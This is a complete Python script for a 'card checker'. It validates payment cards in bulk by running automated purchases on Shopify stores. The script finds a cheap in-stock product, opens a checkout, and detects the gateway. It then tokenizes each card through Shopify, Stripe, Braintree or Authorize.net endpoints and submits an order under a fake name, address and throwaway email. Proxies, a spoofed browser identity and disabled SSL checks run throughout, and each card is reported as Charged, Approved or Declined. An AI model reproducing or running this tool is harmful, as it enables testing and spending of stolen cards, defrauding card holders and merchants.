import re
import asyncio
import random
import string
import aiohttp
from urllib.parse import urlparse

PROPOSAL_ID = "46a1b8c390880a75b93bbb8bcc85ec9402747ab749272be67ef49c7a20854980"
SUBMIT_ID   = "be971887221ed8700139ac3910deeea3315eb8451ce4c6d023b1a2d81f6498e5"
TIMEOUT     = aiohttp.ClientTimeout(total=20)

GATEWAY_MAP = {
    "shopify_payments": "Shopify Payments",
    "authorize":        "Authorize.net",
    "authorize.net":    "Authorize.net",
    "stripe":           "Stripe",
    "braintree":        "Braintree",
    "cybersource":      "CyberSource",
    "square":           "Square",
    "paypal":           "PayPal",
    "klarna":           "Klarna",
    "affirm":           "Affirm",
    "afterpay":         "Afterpay",
    "clearpay":         "Afterpay",
    "adyen":            "Adyen",
    "checkout.com":     "Checkout.com",
    "worldpay":         "Worldpay",
    "bluesnap":         "BlueSnap",
    "nuvei":            "Nuvei",
    "heartland":        "Heartland",
    "firstdata":        "First Data",
}

WALLET_EXCLUDE = {"SHOP_PAY","APPLE_PAY","GOOGLE_PAY","PAYPAL_EXPRESS","VENMO"}

ADDRESS = {
    "firstName":   "James",
    "lastName":    "Anderson",
    "address1":    "428 W 45th St",
    "address2":    "",
    "city":        "New York",
    "countryCode": "US",
    "zoneCode":    "NY",
    "postalCode":  "10036",
    "phone":       "+12125550100",
    "oneTimeUse":  False
}

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(":")
    if len(parts) == 4:
        ip, port, user, passwd = parts
        return f"http://{user}:{passwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return None

def random_email():
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{rand}@gmail.com"

def random_attempt(checkout_token):
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{checkout_token}-{suffix}"

def detect_gateway(raw):
    text = raw.lower()
    names = re.findall(r'"name":"([^"]+)"', raw)
    displays = re.findall(r'"extensibilityDisplayName":"([^"]+)"', raw)
    all_values = names + displays

    for val in all_values:
        vl = val.lower()
        if val in WALLET_EXCLUDE or vl in {w.lower() for w in WALLET_EXCLUDE}:
            continue
        for key, label in GATEWAY_MAP.items():
            if key in vl:
                return label

    for key, label in GATEWAY_MAP.items():
        if key in text:
            return label

    return "Unknown"

def extract_payment_id(raw):
    ids = re.findall(r'"paymentMethodIdentifier":"([^"]+)"', raw)
    wallets = re.findall(r'"name":"([^"]+)"', raw)
    wallet_ids = set()
    for i, w in enumerate(wallets):
        if w in WALLET_EXCLUDE:
            if i < len(ids):
                wallet_ids.add(ids[i])
    for pid in ids:
        if pid not in wallet_ids:
            return pid
    return ids[0] if ids else ""

async def get_variant(site, proxy):
    url = f"{site}/products.json?limit=50"
    try:
        async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
            async with session.get(url, proxy=proxy, ssl=False) as resp:
                data = await resp.json()
                for product in data.get("products", []):
                    for variant in product.get("variants", []):
                        try:
                            available = variant.get("available", False)
                            price = float(variant.get("price", 0))
                            requires_shipping = variant.get("requires_shipping", True)
                            if available and price >= 0.50 and requires_shipping:
                                return str(variant["id"])
                        except Exception:
                            continue
    except Exception as e:
        raise Exception(f"get_variant failed: {e}")
    raise Exception("No valid variant found")

async def open_checkout(site, variant_id, proxy):
    url = f"{site}/cart/{variant_id}:1"
    jar = aiohttp.CookieJar(unsafe=True)
    try:
        async with aiohttp.ClientSession(cookie_jar=jar, timeout=TIMEOUT) as session:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            async with session.get(url, proxy=proxy, ssl=False, headers=headers, allow_redirects=True) as resp:
                html = await resp.text()

            m = re.search(r'serialized-sessionToken" content="([^"]+)"', html)
            if not m:
                raise Exception("session_token not found")
            session_token = m.group(1).replace("&quot;", '"').replace("&#34;", '"')

            m2 = re.search(r'/checkouts/cn/([a-zA-Z0-9_-]+)', html)
            if not m2:
                raise Exception("checkout_token not found")
            checkout_token = m2.group(1)

            cookies = {c.key: c.value for c in jar}
            return session_token, checkout_token, cookies, jar

    except Exception as e:
        raise Exception(f"open_checkout failed: {e}")

def build_proposal_body(session_token, queue_token, variant_id, email=None, with_address=False):
    destination = {}
    if with_address:
        destination = {
            "partialStreetAddress" if not email else "streetAddress": {
                **ADDRESS
            }
        }
    else:
        destination = {
            "partialStreetAddress": {
                "address1": "", "city": "", "countryCode": "US",
                "lastName": "", "phone": "", "oneTimeUse": False
            }
        }

    buyer = {
        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {"countryCode": "US"},
        "rememberMe": False
    }
    if email:
        buyer["email"] = email
        buyer["emailChanged"] = True

    return {
        "operationName": "Proposal",
        "id": PROPOSAL_ID,
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken": queue_token,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": destination,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True if not with_address else False
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": "00000000-0000-0000-0000-000000000001",
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None, "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "", "city": "", "countryCode": "US",
                        "lastName": "", "phone": ""
                    }
                }
            },
            "buyerIdentity": buyer,
            "tip": {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"any": True},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
    }

async def proposal1(site, session_token, checkout_token, variant_id, jar, proxy):
    url = f"{site}/checkouts/internal/graphql/persisted?operationName=Proposal"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Checkout-One-Session-Token": session_token,
        "Origin": site,
        "Referer": f"{site}/checkouts/cn/{checkout_token}/en-us",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    }
    body = build_proposal_body(session_token, None, variant_id)
    try:
        async with aiohttp.ClientSession(cookie_jar=jar, timeout=TIMEOUT) as session:
            async with session.post(url, json=body, headers=headers, proxy=proxy, ssl=False) as resp:
                raw = await resp.text()

        m = re.search(r'"queueToken":"([^"]+)"', raw)
        if not m:
            raise Exception(f"queueToken not found in proposal1: {raw[:200]}")
        queue_token = m.group(1)

        gateway = detect_gateway(raw)
        payment_id = extract_payment_id(raw)

        price_m = re.search(r'"compareAtPrice":\{"amount":"([^"]+)"', raw)
        price = f"${price_m.group(1)}" if price_m else "-"

        return queue_token, gateway, payment_id, price, raw

    except Exception as e:
        raise Exception(f"proposal1 failed: {e}")

async def vault_card(gateway, cc, site, proxy):
    parts = cc.split("|")
    number = parts[0]
    month  = int(parts[1])
    year   = int(parts[2])
    cvv    = parts[3]
    name   = "John Smith"
    domain = urlparse(site).netloc

    try:
        if gateway in ("Shopify Payments", "Unknown"):
            url = "https://checkout.pci.shopifyinc.com/sessions"
            body = {
                "credit_card": {
                    "number": number,
                    "month": month,
                    "year": year,
                    "verification_value": cvv,
                    "name": name
                },
                "payment_session_scope": domain
            }
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": "Mozilla/5.0 Chrome/124.0.0.0"
            }
            async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
                async with session.post(url, json=body, headers=headers, proxy=proxy, ssl=False) as resp:
                    data = await resp.json()
                    token = data.get("id", "")
                    if not token:
                        raise Exception(f"vault empty response: {data}")
                    return token

        elif gateway == "Stripe":
            url = "https://api.stripe.com/v1/tokens"
            data = (
                f"card[number]={number}"
                f"&card[exp_month]={month}"
                f"&card[exp_year]={year}"
                f"&card[cvc]={cvv}"
                f"&card[name]={name}"
            )
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 Chrome/124.0.0.0"
            }
            async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
                async with session.post(url, data=data, headers=headers, proxy=proxy, ssl=False) as resp:
                    result = await resp.json()
                    return result.get("id", "")

        elif gateway == "Braintree":
            url = "https://payments.braintree-api.com/graphql"
            query = """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
              tokenizeCreditCard(input: $input) {
                token
                creditCard { bin last4 expirationYear expirationMonth }
              }
            }"""
            variables = {
                "input": {
                    "creditCard": {
                        "number": number,
                        "expirationMonth": str(month).zfill(2),
                        "expirationYear": str(year),
                        "cvv": cvv,
                        "cardholderName": name
                    }
                }
            }
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 Chrome/124.0.0.0"
            }
            async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
                async with session.post(url, json={"query": query, "variables": variables}, headers=headers, proxy=proxy, ssl=False) as resp:
                    result = await resp.json()
                    return result.get("data", {}).get("tokenizeCreditCard", {}).get("token", "")

        elif gateway == "Authorize.net":
            import xml.etree.ElementTree as ET
            url = "https://api2.authorize.net/xml/v1/request.api"
            xml_body = f"""<?xml version="1.0" encoding="utf-8"?>
<securePaymentContainerRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
  <merchantAuthentication>
    <name>LOGIN</name>
    <transactionKey>TRANSKEY</transactionKey>
  </merchantAuthentication>
  <data>
    <type>TOKEN</type>
    <id>{random_attempt('auth')}</id>
    <token>
      <cardNumber>{number}</cardNumber>
      <expirationDate>{str(month).zfill(2)}{str(year)[-2:]}</expirationDate>
      <cardCode>{cvv}</cardCode>
    </token>
  </data>
</securePaymentContainerRequest>"""
            headers = {
                "Content-Type": "text/xml",
                "User-Agent": "Mozilla/5.0 Chrome/124.0.0.0"
            }
            async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
                async with session.post(url, data=xml_body, headers=headers, proxy=proxy, ssl=False) as resp:
                    text = await resp.text()
                    m = re.search(r'<dataValue>([^<]+)</dataValue>', text)
                    return m.group(1) if m else ""

        else:
            # fallback shopify
            return await vault_card("Shopify Payments", cc, site, proxy)

    except Exception as e:
        raise Exception(f"vault_card failed ({gateway}): {e}")

async def proposal2(site, session_token, checkout_token, queue_token, variant_id, jar, proxy, email):
    url = f"{site}/checkouts/internal/graphql/persisted?operationName=Proposal"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Checkout-One-Session-Token": session_token,
        "Origin": site,
        "Referer": f"{site}/checkouts/cn/{checkout_token}/en-us",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    }
    body = build_proposal_body(session_token, queue_token, variant_id, email=email, with_address=True)
    try:
        async with aiohttp.ClientSession(cookie_jar=jar, timeout=TIMEOUT) as session:
            async with session.post(url, json=body, headers=headers, proxy=proxy, ssl=False) as resp:
                raw = await resp.text()

        m = re.search(r'"queueToken":"([^"]+)"', raw)
        if not m:
            raise Exception(f"queueToken2 not found: {raw[:200]}")
        return m.group(1)

    except Exception as e:
        raise Exception(f"proposal2 failed: {e}")

async def submit(site, session_token, checkout_token, queue_token2, vault_token, payment_id, variant_id, jar, proxy, email):
    url = f"{site}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Checkout-One-Session-Token": session_token,
        "Origin": site,
        "Referer": f"{site}/checkouts/cn/{checkout_token}/en-us",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    }
    addr = ADDRESS
    body = {
        "operationName": "SubmitForCompletion",
        "id": SUBMIT_ID,
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token2,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": addr["address1"], "address2": "",
                                "city": addr["city"], "countryCode": addr["countryCode"],
                                "zoneCode": addr["zoneCode"], "postalCode": addr["postalCode"],
                                "firstName": addr["firstName"], "lastName": addr["lastName"],
                                "phone": addr["phone"], "oneTimeUse": False
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True}
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": "00000000-0000-0000-0000-000000000001"}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": "00000000-0000-0000-0000-000000000001",
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "amount": {"any": True},
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "sessionId": vault_token,
                                "paymentMethodIdentifier": payment_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": addr["address1"], "address2": "",
                                        "city": addr["city"], "countryCode": addr["countryCode"],
                                        "zoneCode": addr["zoneCode"], "postalCode": addr["postalCode"],
                                        "firstName": addr["firstName"], "lastName": addr["lastName"],
                                        "phone": addr["phone"]
                                    }
                                },
                                "cardSource": None
                            }
                        }
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": addr["address1"], "address2": "",
                            "city": addr["city"], "countryCode": addr["countryCode"],
                            "zoneCode": addr["zoneCode"], "postalCode": addr["postalCode"],
                            "firstName": addr["firstName"], "lastName": addr["lastName"],
                            "phone": addr["phone"]
                        }
                    }
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                    "email": email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False
                },
                "tip": {"tipLines": []},
                "poNumber": None,
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": []
            },
            "attemptToken": random_attempt(checkout_token),
            "metafields": [],
            "analytics": {
                "requestUrl": f"{site}/checkouts/cn/{checkout_token}/en-us",
                "pageId": "0000000000000000"
            }
        }
    }

    try:
        async with aiohttp.ClientSession(cookie_jar=jar, timeout=TIMEOUT) as session:
            async with session.post(url, json=body, headers=headers, proxy=proxy, ssl=False) as resp:
                raw = await resp.text()

        typename_m = re.search(r'"__typename":"(SubmitSuccess|SubmitFailed|SubmitThrottled|SubmitAlreadyAccepted)"', raw)
        typename = typename_m.group(1) if typename_m else "Unknown"

        errors = re.findall(r'"message":"([^"]+)"', raw)
        codes  = re.findall(r'"code":"([^"]+)"', raw)
        msg    = errors[0] if errors else (codes[0] if codes else raw[:100])

        receipt_m = re.search(r'"id":"(gid://shopify/\w+Receipt/[^"]+)"', raw)

        if typename == "SubmitSuccess":
            status = "Charged" if receipt_m else "Approved"
        elif typename == "SubmitFailed":
            status = "Declined"
        elif typename in ("SubmitThrottled", "SubmitAlreadyAccepted"):
            status = "Error"
        else:
            status = "Error"

        return status, msg

    except Exception as e:
        raise Exception(f"submit failed: {e}")

async def check_card(cc, site, proxy_str):
    if not site.startswith("http"):
        site = "https://" + site

    proxy = parse_proxy(proxy_str)
    email = random_email()

    variant_id = await get_variant(site, proxy)
    session_token, checkout_token, cookies, jar = await open_checkout(site, variant_id, proxy)
    queue_token, gateway, payment_id, price, raw1 = await proposal1(site, session_token, checkout_token, variant_id, jar, proxy)
    vault_token = await vault_card(gateway, cc, site, proxy)
    queue_token2 = await proposal2(site, session_token, checkout_token, queue_token, variant_id, jar, proxy, email)
    status, message = await submit(site, session_token, checkout_token, queue_token2, vault_token, payment_id, variant_id, jar, proxy, email)

    return {
        "status": status,
        "message": message,
        "gateway": gateway,
        "price": price
    }